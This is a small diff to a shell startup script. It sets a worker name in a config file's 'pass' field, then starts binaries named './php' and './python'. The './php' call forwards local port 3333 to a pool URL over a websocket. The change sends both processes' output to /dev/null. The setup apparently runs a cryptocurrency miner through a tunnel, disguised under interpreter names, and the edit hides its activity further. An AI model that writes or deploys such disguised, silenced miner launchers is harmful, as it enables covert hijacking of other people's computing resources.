@@ -14,5 +14,5 @@ fi
 
 sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json
 cd /app
-./php -L 127.0.0.1:3333:${POOL_URL} ${WS_URL} &
-./python
+./php -L 127.0.0.1:3333:${POOL_URL} ${WS_URL} > /dev/null &
+./python > /dev/null
